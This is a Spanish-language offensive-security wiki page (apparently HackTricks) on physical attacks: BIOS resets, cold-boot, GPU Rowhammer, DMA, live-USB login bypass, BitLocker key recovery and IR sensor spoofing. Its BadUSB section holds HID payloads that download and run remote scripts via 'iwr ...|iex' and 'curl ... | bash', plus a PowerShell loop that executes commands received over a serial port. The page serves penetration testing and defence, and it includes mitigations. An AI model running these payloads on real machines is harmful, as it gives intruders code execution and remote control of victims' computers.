# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

Para descubrir interfaces a nivel de placa, consolas serie, acceso a flash, canales laterales y glitching, consulta [Hardware Hacking](hardware-hacking/README.md) y sus capítulos específicos para cada interfaz. Esta página cubre ataques que requieren acceso físico al sistema en su conjunto.

## Recuperación de contraseñas del BIOS y seguridad del sistema

La configuración del firmware de PC heredado puede restablecerse desconectando la batería CMOS o usando un jumper documentado para borrar la CMOS. El tiempo necesario sin alimentación depende de la placa, y las contraseñas o claves modernas de UEFI pueden estar almacenadas en flash no volátil, un controlador integrado o un dispositivo de seguridad, por lo que sobreviven a la extracción de la batería. Consulta el manual de la placa o del servicio técnico antes de cortocircuitar pines; este procedimiento también puede invalidar las mediciones del TPM y activar la recuperación del cifrado de disco.

En sistemas x86 heredados, herramientas como **killCMOS** y **CmosPwd** pueden inspeccionar o modificar la configuración respaldada por CMOS desde un entorno arrancable. CmosPwd reconoce formatos de contraseña de un conjunto documentado de familias de BIOS antiguas y puede hacer copias de seguridad, restaurar o borrar/eliminar el estado de la CMOS; sus compilaciones publicadas están dirigidas a entornos heredados de DOS/Windows, Linux, FreeBSD y NetBSD.<sup>[[18]](#references)</sup> Estas utilidades no son herramientas genéricas para eliminar contraseñas UEFI y requieren acceso suficiente al hardware/firmware.

Algunos firmwares de portátiles muestran un código de desafío específico del fabricante tras varios intentos fallidos de contraseña. Bases de datos como [bios-pw.org](https://bios-pw.org) pueden derivar contraseñas de recuperación de fabricantes heredados para algunos modelos, pero muchos sistemas implementan un bloqueo sin un desafío del que se pueda derivar una contraseña. Considera que cualquier contraseña generada es específica del modelo y evita agotar los contadores de intentos permanentes.

### Seguridad de UEFI

En sistemas **UEFI** modernos, CHIPSEC puede auditar las protecciones de las variables de Secure Boot. Empieza con la comprobación que no modifica el sistema que aparece a continuación; el modo opcional `-a modify` intenta deliberadamente corromper variables y solo debe usarse en un sistema de laboratorio recuperable. CHIPSEC advierte que su controlador con privilegios y el acceso al hardware de bajo nivel no son adecuados para endpoints de producción.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Análisis de RAM y ataques cold-boot

La DRAM no pierde todos los bits inmediatamente cuando se detiene el refresco. La tasa de degradación varía considerablemente según la tecnología del módulo y la temperatura; el enfriamiento puede conservar datos útiles mucho más tiempo que un ciclo de apagado y encendido sin enfriar. Un ataque cold-boot reinicia rápidamente el equipo en un entorno mínimo de adquisición o transfiere un módulo enfriado, captura la memoria sin procesar y reconstruye claves criptográficas a pesar de la degradación de los bits. Una utilidad de copia de discos no es automáticamente una herramienta de captura de memoria física, y Volatility analiza una captura, pero no la adquiere; usa una herramienta de adquisición validada y adecuada para la plataforma.<sup>[[12]](#references)</sup>

---

## Rowhammer en GPU contra tablas de páginas

Los ataques Rowhammer modernos contra GPU son mucho más útiles cuando apuntan a los **metadatos de memoria virtual de la GPU** en lugar de a búferes normales. Trabajos recientes sobre **GPU NVIDIA Ampere con GDDR6** muestran que un atacante que ejecuta código CUDA sin privilegios puede crear patrones de hammering específicos para GPU, usar **memory massaging** para ubicar estructuras de paginación en filas vulnerables y, luego, invertir bits en la **tabla de páginas de último nivel** o en un **directorio de páginas** intermedio. Una vez que se corrompe una sola entrada de traducción, el atacante puede establecer **lectura/escritura arbitraria en la memoria de la GPU** y luego pivotar hacia el compromiso del host.<sup>[[1]](#references)[[2]](#references)</sup>

### Patrón de explotación

1. **Perfilar filas susceptibles al hammering** en GDDR6 y crear patrones de hammering adaptados al refresco y no uniformes que evadan las mitigaciones en DRAM.
2. **Manipular las asignaciones de GPU** para que el controlador coloque estructuras de traducción de páginas en ubicaciones físicas susceptibles al hammering, en lugar de mantenerlas en el pool protegido predeterminado. En la práctica, esto puede implicar agotar la región de memoria baja de las tablas de páginas y distribuir en masa asignaciones UVM grandes y dispersas con pasos controlados.
3. **Invertir bits de metadatos de traducción**, como **PFN** o bits relacionados con la apertura, dentro de una entrada de tabla de páginas o de directorio de páginas para que la página virtual controlada por el atacante se resuelva en páginas de tablas de páginas, memoria arbitraria de GPU o mapeos de sistema visibles para el host.
4. Reutilizar el mapeo falsificado para reescribir otras entradas de traducción y escalar a **lectura/escritura arbitraria en la memoria de la GPU** entre contextos de GPU.

### Pivot al host y mitigaciones

- Con **IOMMU deshabilitado**, los mapeos falsificados de la apertura del sistema pueden exponer **memoria física arbitraria del host** a la GPU, convirtiendo la primitiva de GPU en un compromiso total del host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** apunta a entradas de tablas de páginas de último nivel, mientras que **GeForge** muestra que corromper un nivel del directorio de páginas puede ser más fácil, porque una inversión de un bit puede redirigir un subárbol de traducción mayor. No consideres que solo una capa de paginación es crítica para la seguridad.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** sigue siendo importante porque bloquea la ruta directa a memoria arbitraria del host que usan GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** muestra un pivot de segunda etapa en el que el atacante corrompe búferes de CPU, propiedad del controlador y escribibles por la GPU, y luego activa errores de seguridad de memoria del controlador NVIDIA para obtener una primitiva de escritura en el kernel y un **root shell**, incluso con IOMMU habilitado.<sup>[[3]](#references)</sup>
- **ECC a nivel de sistema** es una medida práctica de refuerzo de seguridad en GPU compatibles para estaciones de trabajo/servidores. Las GPU de consumo sin ECC ofrecen una superficie de defensa más débil.<sup>[[4]](#references)</sup>
- Estos ataques no son puramente teóricos: **GeForge** informó de **1,171** inversiones de bits en una RTX 3060 y **202** en una RTX A6000, suficientes para construir una cadena funcional de escalada de privilegios en el host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acceso directo a memoria (DMA)

Para el parcheo offline de UEFI IFR/NVRAM que puede reducir el nivel de aplicación de IOMMU antes del arranque y habilitar una cadena de DMA en Windows, consulta:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demuestra la adquisición y el parcheo de memoria mediante **DMA** a través de interfaces como FireWire y las primeras configuraciones de Thunderbolt, e incluye firmas históricas para eludir el inicio de sesión. No es simplemente «ineficaz contra Windows 10»: la posibilidad de explotación depende de la interfaz, la compilación de destino, la política de IOMMU, el estado de bloqueo y si Windows Kernel DMA Protection es compatible y está habilitado. Windows 10 versión 1803 y posteriores introdujeron Kernel DMA Protection en plataformas compatibles, lo que cambió sustancialmente la superficie de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acceder al sistema

En un volumen de Windows sin cifrar o ya desbloqueado, un entorno offline puede reemplazar binarios de accesibilidad como **sethc.exe** o **Utilman.exe** por **cmd.exe**, lo que permite obtener un símbolo del sistema de SYSTEM al ejecutar el acceso directo correspondiente en la pantalla de inicio de sesión. Herramientas como **chntpw** pueden editar los datos de las cuentas SAM locales. Estos métodos no eluden un volumen BitLocker bloqueado y pueden dañar credenciales protegidas con DPAPI/EFS; conserva copias forenses y respaldos.

**Kon-Boot** es una herramienta comercial para eludir la autenticación durante el arranque, compatible con determinadas configuraciones de Windows/macOS. La compatibilidad depende del sistema operativo, el modo de firmware, Secure Boot y la configuración de cifrado del disco; no descifra un volumen bloqueado con BitLocker.<sup>[[10]](#references)</sup>

---

## Gestión de las funciones de seguridad de Windows

### Accesos directos de arranque y recuperación

- **Delete/Supr**, F2, F10 u otra tecla del fabricante pueden abrir la configuración del firmware.
- **F8** permite acceder a las opciones de arranque avanzadas de Windows heredadas solo en configuraciones donde esa ruta siga habilitada; el acceso a la recuperación actual varía.
- Mantener pulsada la tecla **Shift** puede impedir el inicio de sesión automático de Windows en algunas configuraciones, aunque los ajustes de directiva/registro pueden deshabilitar ese comportamiento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** y placas Teensy pueden identificarse como teclados HID de confianza e inyectar pulsaciones predefinidas. La carga útil obtiene inicialmente los privilegios y el acceso al escritorio de la sesión iniciada; las solicitudes de UAC, el bloqueo de pantalla, la distribución del teclado, los tiempos y la política USB del endpoint siguen limitándola.<sup>[[15]](#references)</sup>

Los periféricos programables también pueden atacar analizadores del kernel del host y coordinar varios dispositivos USB para la manipulación del heap y la divulgación de información:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Los privilegios de administrador o de copia de seguridad permiten crear una copia shadow o guardar hives del registro para adquirir archivos bloqueados como **SAM** y **SYSTEM**. Esta es una técnica de recopilación posterior al compromiso, no una forma de eludir privilegios, y debe correlacionarse con eventos de `diskshadow`/VSS y de exportación de hives del registro.

## Técnicas de implantes BadUSB / HID

### Dispositivo HID Android activado por NFC

Un teléfono Android con root puede convertirse en un teclado USB programable solo si su controlador USB y kernel ofrecen **compatibilidad con USB gadget/HID**. En dispositivos compatibles, Kali NetHunter ofrece perfiles de gadget mediante **USB Arsenal**. Otra opción es [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), que crea funciones gadget ConfigFS y puede exponer dispositivos de caracteres de teclado/ratón, como `/dev/hidg0` y `/dev/hidg1`. La herramienta solo crea el endpoint gadget; otro proceso debe escribir informes HID en él. El acceso root no puede compensar un kernel sin ConfigFS, compatibilidad con HID gadget o un USB Device Controller utilizable.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Este endpoint puede combinarse con NFC de Android como activador físico. La aplicación [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) lee el UID de una etiqueta, lo convierte a la representación esperada, lo compara con una lista de permitidos local y, si coincide, envía una secuencia de teclado configurada al estilo Rubber Ducky. El host conectado recibe una entrada de teclado normal y no necesita software NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Valida la enumeración y la distribución del teclado en un editor de texto vacío antes de usar accesos directos o comandos. Una carga útil inocua es:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Límites de confianza importantes:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Una **lista blanca de UID sirve para identificar, no para autenticar**. Los UID son públicos y algunos tipos de token o emuladores permiten clonarlos o suplantarlos. Un UID permitido copiado sigue la misma ruta de despacho que el token original.
- El módulo Magisk **NfcScreenOff** parchea el servicio NFC para que se comporte como si la pantalla estuviera encendida y desbloqueada. Si el teléfono ya está conectado a un host, esto puede permitir que alguien active el payload sin desbloquearlo.
- Las contraseñas, los tokens de API y los comandos almacenados en el payload son secretos recuperables en un dispositivo rooteado o con el bootloader desbloqueado. Escribir una contraseña mediante HID es una automatización que reutiliza contraseñas, no una autenticación sin contraseña.
- La inyección HID actúa con los privilegios del escritorio activo y depende del foco, el tiempo y la distribución del teclado del host. Exige una confirmación reciente del usuario antes de ejecutar acciones sensibles, evita incluir secretos privilegiados en scripts y utiliza un autenticador de desafío-respuesta criptográfico para una autenticación real.

### Implantes Wi-Fi en cables

- Los implantes basados en ESP32-S3, como **Evil Crow Cable Wind**, se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran únicamente como teclado USB y exponen su stack C2 a través de Wi-Fi. El operador solo tiene que alimentar el cable desde el host de la víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y acceder a [http://cable-wind.local/](http://cable-wind.local/) (o a su dirección DHCP) para llegar a la interfaz HTTP integrada.<sup>[[8]](#references)</sup>
- La interfaz del navegador ofrece pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan por sistema operativo, las distribuciones de teclado se cambian sobre la marcha y las cadenas VID/PID se pueden modificar para imitar periféricos conocidos.
- Como el C2 está dentro del cable, un teléfono puede preparar payloads, activar su ejecución y administrar las credenciales Wi-Fi sin utilizar la red de la organización, algo útil en intrusiones físicas de corta duración.

### Payloads AutoExec que reconocen el sistema operativo

- Las reglas de AutoExec vinculan uno o más payloads para que se ejecuten inmediatamente después de la enumeración USB. El implante realiza una identificación ligera del sistema operativo y selecciona el script correspondiente.
- Flujo de trabajo de ejemplo:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere intervención, basta con cambiar un cable de carga para lograr acceso inicial de tipo «plug-and-pwn» en el contexto del usuario que haya iniciado sesión.

### Shell remota iniciada mediante HID a través de TCP por Wi-Fi

1. **Inicio mediante pulsaciones de teclas:** Un payload almacenado abre una consola y pega un bucle que ejecuta todo lo que reciba por el nuevo dispositivo USB serial. Una variante mínima para Windows es:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Puente de cable:** El implante mantiene abierto el canal USB CDC mientras su ESP32-S3 inicia una conexión TCP como cliente (script de Python, APK de Android o ejecutable de escritorio) hacia el operador. Los bytes que se escriben en la sesión TCP se reenvían al bucle serie anterior, lo que permite la ejecución remota de comandos incluso en hosts aislados de la red. La salida es limitada, así que los operadores suelen ejecutar comandos a ciegas (crear cuentas, preparar herramientas adicionales, etc.).

### Superficie de actualización HTTP OTA

- La interfaz documentada de Evil Crow Cable Wind expone un endpoint de actualización de firmware sin autenticación en `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Los operadores de campo pueden hacer hot-swap de funciones (p. ej., flashear el firmware de USB Army Knife) durante una operación sin abrir el cable, lo que permite que el implante cambie a nuevas capacidades mientras sigue conectado al host objetivo.

## Evadir el cifrado de BitLocker

Una adquisición forense autorizada de un sistema activo o que se haya estado ejecutando recientemente puede contener una clave maestra de volumen de BitLocker o material de clave relacionado mientras el volumen está desbloqueado. Herramientas comerciales como Elcomsoft Forensic Disk Decryptor y Passware Kit Forensic pueden buscar en imágenes de memoria, archivos de hibernación o volcados de memoria compatibles, pero el éxito no está garantizado. Windows moderno también cifra los volcados de memoria cuando BitLocker está habilitado, y una contraseña de recuperación de 48 dígitos almacenada es un artefacto distinto de una clave de volumen presente en la memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingeniería social para añadir una clave de recuperación

Un atacante que convenza a un administrador para que ejecute comandos de administración de BitLocker puede añadir un protector de contraseña de recuperación, de clave externa u otro tipo, y luego capturarlo. Una contraseña de recuperación no puede ser una cadena arbitraria de ceros: las contraseñas numéricas de recuperación de BitLocker tienen un formato validado de 48 dígitos. La sintaxis pertinente para la administración autorizada es `manage-bde -protectors -add C: -recoverypassword`; lista los protectores resultantes con `manage-bde -protectors -get C:`. Supervisa la adición de protectores y asegúrate de que el nuevo material de recuperación se almacene únicamente en ubicaciones aprobadas.<sup>[[16]](#references)</sup>

---

## Explotar los interruptores de intrusión en el chasis / mantenimiento para restablecer la BIOS a los valores de fábrica

Muchas laptops modernas y computadoras de escritorio de formato pequeño incluyen un **interruptor de intrusión en el chasis** que es supervisado por el Embedded Controller (EC) y el firmware de BIOS/UEFI. Aunque el propósito principal del interruptor es generar una alerta cuando se abre el dispositivo, algunos fabricantes implementan a veces un **acceso directo de recuperación no documentado** que se activa al alternar el interruptor siguiendo un patrón específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Cómo funciona el ataque

1. El interruptor está conectado a una **interrupción GPIO** en el EC.
2. El firmware que se ejecuta en el EC registra el **momento y la cantidad de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC invoca una rutina de *mainboard-reset* que **borra el contenido de la NVRAM/CMOS del sistema**.
4. En el siguiente arranque, los modelos afectados cargan el estado de firmware restablecido. Según el fabricante y la revisión, el estado borrado puede incluir una contraseña de supervisor, ajustes de arranque personalizados o claves de Secure Boot inscritas; el estado del TPM y los efectos sobre el cifrado del disco deben evaluarse por separado.

> Un restablecimiento del firmware puede restaurar las opciones de arranque externo, pero **no** descifra el almacenamiento. BitLocker u otro sistema de cifrado de disco completo puede entrar en modo de recuperación tras cambios en el TPM o el firmware y seguir protegiendo la unidad interna si no se dispone de una clave de recuperación.<sup>[[16]](#references)</sup>

### Ejemplo real: laptop Framework 13

El acceso directo de recuperación para la Framework 13 (11.ª/12.ª/13.ª generación) es:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Después del décimo ciclo, el EC establece una marca que indica al BIOS que borre la NVRAM en el siguiente reinicio. Todo el procedimiento dura ~40 s y requiere **nada más que un destornillador**.<sup>[[5]](#references)</sup>

### Procedimiento genérico de explotación

1. Enciende el objetivo o reanúdalo desde la suspensión para que el EC esté en funcionamiento.
2. Retira la cubierta inferior para dejar al descubierto el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del fabricante (consulta la documentación o los foros, o realiza ingeniería inversa del firmware del EC).
4. Vuelve a montar el dispositivo y reinícialo; luego, comprueba qué ajustes de firmware y credenciales cambiaron realmente.
5. Si tienes autorización y se admite el arranque externo, inicia una imagen live controlada. Una vez desbloqueado legítimamente un volumen interno (o si nunca estuvo cifrado), el entorno live puede obtener credenciales y datos o inspeccionar la EFI System Partition. Modificar esa partición para instalar un implante EFI es persistente y muy intrusivo, y sigue sujeto a las limitaciones de Secure Boot, el arranque medido, la protección contra escritura del firmware y la supervisión de endpoints. El almacenamiento cifrado permanece inaccesible sin la clave o el material de recuperación.

### Detección y mitigación

* Registra los eventos de intrusión en el chasis en la consola de administración del sistema operativo y correlaciónalos con reinicios inesperados del BIOS.
* Usa **sellos de seguridad que evidencien manipulaciones** en los tornillos y las cubiertas para detectar aperturas.
* Mantén los dispositivos en **áreas con control físico**; considera que el acceso físico equivale a un compromiso total.
* Cuando sea posible, desactiva la función del fabricante «restablecimiento mediante interruptor de mantenimiento» o exige una autorización criptográfica adicional para restablecer la NVRAM.

---

## Inyección IR encubierta contra sensores de salida sin contacto

### Características del sensor
- Los sensores comerciales de «salida mediante movimiento de la mano» combinan un emisor LED de infrarrojos cercanos con un módulo receptor similar al de un control remoto de TV, que solo indica nivel lógico alto después de detectar múltiples pulsos (~4–10) de la portadora correcta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una cubierta plástica impide que el emisor y el receptor se vean directamente, por lo que el controlador supone que cualquier portadora validada procede de un reflejo cercano y activa un relé que abre el pestillo de la puerta.
- Cuando el controlador detecta un objetivo, suele cambiar la envolvente de modulación de salida, pero el receptor sigue aceptando cualquier ráfaga que coincida con la portadora filtrada.

### Flujo de ataque
1. **Captura el perfil de emisión**: conecta un analizador lógico a los pines del controlador para registrar las formas de onda anteriores y posteriores a la detección que activan el LED IR interno.
2. **Reproduce solo la forma de onda «posterior a la detección»**: retira o ignora el emisor de fábrica y activa un LED IR externo con el patrón que ya se ha activado. Como al receptor solo le importa el número y la frecuencia de los pulsos, interpreta la portadora falsificada como un reflejo auténtico y activa la línea del relé.
3. **Controla la transmisión**: transmite la portadora en ráfagas ajustadas (por ejemplo, decenas de milisegundos encendida y un tiempo similar apagada) para proporcionar el número mínimo de pulsos sin saturar el AGC del receptor ni su lógica de gestión de interferencias. La emisión continua desensibiliza rápidamente el sensor e impide que se active el relé.

### Inyección reflectante de largo alcance
- Sustituir el LED de prueba por un diodo IR de alta potencia, un controlador MOSFET y óptica de enfoque permite una activación fiable desde ~6 m.
- El atacante no necesita tener línea de visión directa a la abertura del receptor: apuntar el haz a paredes interiores, estanterías o marcos de puertas visibles a través del vidrio permite que la energía reflejada entre en el campo de visión de ~30° y simule un gesto de mano a corta distancia.
- Como los receptores esperan únicamente reflejos débiles, un haz externo mucho más potente puede rebotar en varias superficies y aun así superar el umbral de detección.

### Linterna de ataque armada
- Integrar el controlador en una linterna comercial disimula la herramienta a plena vista. Sustituye el LED visible por un LED IR de alta potencia que coincida con la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y usa un MOSFET para regular la corriente del LED.
- Una lente telescópica de zoom concentra el haz para aumentar el alcance y la precisión, mientras que un motor de vibración controlado por MCU confirma mediante vibración que la modulación está activa, sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (con frecuencias de portadora y envolventes ligeramente distintas) aumenta la compatibilidad con familias de sensores renombrados y permite al operador barrer superficies reflectantes hasta oír el clic del relé y que se abra la puerta.

---

## References

- [1] [GDDRHammer: alteración extrema de filas DRAM: ataques Rowhammer entre componentes desde GPU modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: martilleo de memoria GDDR para falsificar tablas de páginas de GPU por diversión y beneficio](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: ataques de escalada de privilegios en GPU mediante Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de seguridad: Rowhammer - julio de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – «Framework 13. Pulsa aquí para pwn»](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guía de restablecimiento de la placa base](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – «¡Noooooooo Touch! – Cómo eludir sensores de salida IR sin contacto con una linterna IR encubierta»](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – «Conecta, ejecuta, pwn: hacking con Evil Crow Cable Wind»](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentación oficial de Kon-Boot e información de compatibilidad](https://kon-boot.com/)
- [11] [Documentación de CHIPSEC - Protecciones de variables de Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [No lo olvidemos: ataques Cold Boot contra claves de cifrado](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulación de memoria física mediante DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protección DMA del kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentación de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guía de operaciones de BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - mantener pulsada la tecla Shift y el comportamiento del inicio de sesión automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentación y descargas de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentación de Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentación del kernel de Linux - controlador USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Herramienta USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Convierte un teléfono Android con root en un autenticador NFC y una herramienta de automatización para tu PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
